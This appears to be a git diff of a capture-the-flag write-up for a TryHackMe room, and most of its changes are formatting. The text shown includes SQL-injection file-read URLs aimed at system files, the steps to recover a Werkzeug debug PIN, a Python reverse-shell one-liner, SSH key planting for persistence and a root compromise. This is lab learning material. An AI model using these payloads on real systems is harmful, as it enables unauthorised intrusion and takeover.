@@ -17,11 +17,11 @@ Scan the QR code and you are in! Welcome to [The Bandit Surfer](https://tryhackm
 ## The Bandit Surfer Introduction
 
 <p align="left">
-  <img height=100 img src=./readme_assets/challenge.PNG/>
+  <img height=150 img src=./readme_assets/challenge.PNG/>
 </p>
 
 <p align="left">
-  <img height=300 img src=./readme_assets/hints.PNG/>
+  <img height=350 img src=./readme_assets/hints.PNG/>
 </p>
 
 Ha! I've outdone meself, me hearty! After pokin' through every digital nook and cranny, crackin' a router wide open, and sneakin' into Frost-eau's laptop, I've unearthed every last secret, leadin' me straight to the heart of the icy storm. This is it, the moment I've been waitin' for since last year's icy fiasco – my shot at redemption in the frozen wilderness. But that sly detective Frost-eau is hot on my snowy trail. I gotta be quick as a hare and sly as a fox to stay ahead.
@@ -80,15 +80,15 @@ Progress: 4614 / 4615 (99.98%)
 /download gives us a `No file selected...` message
 
 On the main webpage you can hover over an elf image to see the download url:
-
+```
 rh:8000/download?id=1
 rh:8000/download?id=2
 rh:8000/download?id=3
-
+```
 Trying other numbers we find image 4.
 
 <p align="left">
-  <img height=300 img src=./readme_assets/download.png/>
+  <img height=400 img src=./readme_assets/download.png/>
 </p>
 
 Any other number brings us to an error page that has some interesting information on it.
@@ -115,18 +115,20 @@ private_bits = [
 ```
 
 The public bits can be found on the error page we found earlier:
+```
 mcskidy = username
 flask.app = modname
 Flask = getattr(app, '__name__', getattr(app.__class__, '__name__'))
 /home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py = getattr(mod, '__file__', None)
-
+```
 To find the private bits we will need to use Local File inclusion (LFI):
+```
 For Mac address use `http://rh:8000/download?id=' union select "file:///sys/class/net/eth0/address" where 1=1 and '1'='1`
 The mac address must be converted to decimal before using.
 The mac address will change each time you restart the THM room machine.
-
+```
 <p align="left">
-  <img height=300 img src=./readme_assets/mac-address.PNG/>
+  <img height=200 img src=./readme_assets/mac-address.PNG/>
 </p>
 
 For machine-id use `http://rh:8000/download?id=' union select "file:///etc/machine-id" where 1=1 and '1'='1`
@@ -183,7 +185,7 @@ print(rv)
 Run the exploit code to receive your pin.
 
 <p align="left">
-  <img height=300 img src=./readme_assets/pin.PNG/>
+  <img height=100 img src=./readme_assets/pin.PNG/>
 </p>
 
 Once you enter the correct pin you will have access to the interactive console.
@@ -199,7 +201,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ```
 
 <p align="left">
-  <img height=300 img src=./readme_assets/shell.PNG/>
+  <img height=500 img src=./readme_assets/shell.PNG/>
 </p>
 
 Start the listener on your VM:
@@ -213,22 +215,23 @@ Return to your listener and you should now have a reverse shell.
 </p>
 
 If your shell is fragile you can strengthen it using the following commands:
-*On the remote server:*  
-`python3 -c 'import pty;pty.spawn("/bin/bash")'` 
+```
+On the remote server:  
+python3 -c 'import pty;pty.spawn("/bin/bash")' 
 CTRL-Z  
-*On your local system:* 
-`echo $TERM` (my result = xterm-256color)  
-`stty -a` (note rows and columns (45 x 175))  
-`stty raw -echo`  
-`fg`  
-*Back on the remote server:*  
-`reset`  
-`xterm`  
-`export TERM=xterm`  
-`export SHELL=/bin/bash`  
-`stty rows 45 columns 175` (again, use whatever you got from `stty -a`)  
-`reset`
-
+On your local system: 
+echo $TERM` (my result = xterm-256color)  
+stty -a (note rows and columns (45 x 175))  
+stty raw -echo 
+fg  
+Back on the remote server:  
+reset  
+xterm 
+export TERM=xterm 
+export SHELL=/bin/bash  
+stty rows 45 columns 175 (again, use whatever you got from stty -a)  
+reset
+```
 You should now have a proper shell with grep and nano capabilities.
 
 Using `ls` in the mcskidy directory you will find user.txt and the first flag.
@@ -334,15 +337,15 @@ mysql = MySQL(app)
 ```
 
 A team member figure out how to log into ssh using this [resource](https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/).
-
-*On your VM:*
-`ssh-keygen`  
-`cat ~/.ssh/id_rsa.pub`  
-*On the THM box:* 
-`echo "CONTENT OF PREVIOUS FILE" >> /home/mcskidy/.ssh/authorized_keys` 
+```
+On your VM:
+ssh-keygen  
+cat ~/.ssh/id_rsa.pub  
+On the THM box: 
+echo "CONTENT OF PREVIOUS FILE" >> /home/mcskidy/.ssh/authorized_keys 
 On your VM: 
-`ssh mcskidy@BOX_IP`
-
+ssh mcskidy@BOX_IP
+```
 This opens up port 8000 for experimenting.
 
 We spent days combing through every file and trying any privsec technique we came across with no success at getting root. 2 files we found seemed like the pathway but we were having trouble figuring out how to use them.
@@ -412,9 +415,8 @@ Server username: root
 ```
 
 **We are root!**
-
+```
 Listing: /root
-==============
 
 Mode              Size  Type  Last modified              Name
 ----              ----  ----  -------------              ----
@@ -429,14 +431,9 @@ Mode              Size  Type  Last modified              Name
 100640/rw-r-----  38    fil   2023-10-19 01:40:20 -0500  root.txt
 040700/rwx------  4096  dir   2023-03-27 18:25:12 -0500  snap
 100640/rw-r-----  43    fil   2023-12-13 11:24:39 -0600  yetikey4.txt
-
+```
 Cat the `root.txt` and `yetikey4.txt` files for the final two flags.
 
 <p align="left">
   <img height=300 img src=./readme_assets/flags.PNG/>
 </p>
-
-<p align="left">
-  <img height=300 img src=./readme_assets/all-four.PNG/>
-</p>
-
